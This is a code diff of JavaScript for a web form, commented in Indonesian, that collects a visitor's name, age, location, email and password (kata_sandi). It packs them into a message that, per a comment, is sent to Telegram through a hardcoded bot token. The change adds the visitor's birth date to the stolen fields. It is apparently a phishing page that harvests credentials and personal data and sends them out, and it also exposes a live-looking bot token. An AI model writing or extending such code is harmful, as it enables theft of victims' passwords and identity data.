@@ -54,9 +54,8 @@ inputDate.addEventListener("change", function() {
   var selectedDate = inputDate.value;
   var dateObject = new Date(selectedDate);
   var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-  var formattedDate = dateObject.toLocaleDateString('id-ID', options);
+  const tanggal_lahir = dateObject.toLocaleDateString('id-ID', options);
 
-  alert("Tanggal Yang Dipilih: " + formattedDate);
 });
 
  const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
@@ -82,14 +81,14 @@ form.addEventListener('submit', async (event) => {
   const alamat = document.getElementById('lokasi').value;
   const email = document.getElementById('email').value;
   const kata_sandi = document.getElementById('kata_sandi').value;
-
   // Buat string dari data yang diambil
   const message = `
-    Nama : ${nama}
-    Umur : ${umur} Tahun
-    Lokasi : ${alamat}
-    Email : ${email}
-    Kata Sandi : ${kata_sandi}
+  Nama : ${nama}
+  Umur : ${umur} Tahun
+  Tanggal Lahir : ${tanggal_lahir}
+  Lokasi : ${alamat}
+  Email : ${email}
+  Kata Sandi : ${kata_sandi}
   `;
 
   // Kirim data ke Telegram
